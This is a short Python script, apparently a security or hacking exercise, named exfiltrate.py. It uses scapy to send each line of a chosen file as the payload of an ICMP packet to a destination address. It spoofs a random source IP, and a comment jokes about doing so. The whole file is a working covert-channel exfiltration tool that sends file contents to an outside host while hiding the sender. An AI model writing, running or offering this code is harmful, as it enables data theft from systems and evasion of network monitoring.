from scapy.all import IP, ICMP, RandIP, send
import sys

if len(sys.argv) != 3:
    print("Usage: python3 exfiltrate.py <destination ip> <file>")
    sys.exit(0)

dstHost = sys.argv[1]
var = open(sys.argv[2])

try:
    for i in var:
        pkt = IP(src=RandIP(),dst=dstHost)/ICMP()/i.strip() #randomize the source ip because why not? hehe
        send(pkt, verbose=0)

    var.close()
except: # catch *all* exceptions
    e = sys.exc_info()[0]
    print(e)
    sys.exit(1)
